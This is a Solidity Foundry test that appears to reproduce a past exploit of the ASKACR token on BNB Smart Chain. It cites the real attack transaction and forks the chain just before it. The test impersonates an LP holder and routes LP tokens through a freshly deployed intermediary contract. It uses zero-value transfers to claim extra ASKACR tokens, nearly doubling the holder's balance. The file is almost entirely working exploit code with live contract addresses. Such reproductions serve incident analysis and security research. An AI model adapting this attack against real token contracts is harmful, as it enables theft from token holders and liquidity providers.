// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Intermediary {
    constructor(IERC20 pair) {
        pair.approve(msg.sender, type(uint256).max);
    }

    function withdraw(IERC20 token) external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}

contract ASKACRTest is Test {
    //Attacking TX: https://bscscan.com/tx/0xc20fa4953ff394bb806a57cafe71d1163973c0e5a47bb8dad1703a518b15ea3b
    IERC20 askacr = IERC20(0x5aE4b2F92F03717F3bdFE3B440D14d2f212D3745);
    IERC20 pair = IERC20(0xB93783F29dd52cad2CBBfe2E5d06C318b63995B2);
    address lpHolder = 0x13F110CBBe4151E0a2e241d5a29e6f86f0CEA1e4;
    //--fork-block-number 26658150, 2 blocks before the attacking
    function testASKACRAttack() public {
        uint balance = pair.balanceOf(address(lpHolder));
        //assume the hacker is one of the lp token holder to skip the steps of flashloan, swapping and adding liquidity.
        address hacker = lpHolder;
        //At the begin, the hacker has no ASKACR token
        assertEq(balance, 1711299605121882680806);
        assertEq(askacr.balanceOf(address(hacker)), 8728411131443188467);

        //impersonate the hacker
        vm.startPrank(address(hacker));
        askacr.transfer(address(hacker), 0);
        //create a new contract
        Intermediary new1 = new Intermediary(IERC20(pair));
        //transfer LP token to the new contract
        pair.transfer(address(new1), pair.balanceOf(address(hacker)));
        //new contract transfers 0 ASKACR token to itself
        askacr.transferFrom(address(new1), address(new1), 0);
        //new contract withdraws ASKACR token to the hacker
        new1.withdraw(askacr);
        //new contract transfers ASKACR token to the hacker
        pair.transferFrom(address(new1), address(hacker), pair.balanceOf(address(new1)));

        //At the end
        assertEq(pair.balanceOf(address(hacker)), 1711299605121882680806);
        // ASKACR token increased from 8728411131443188467 to 17388698494177696810
        assertEq(askacr.balanceOf(address(hacker)), 17388698494177696810);
        vm.stopPrank();
    }
}


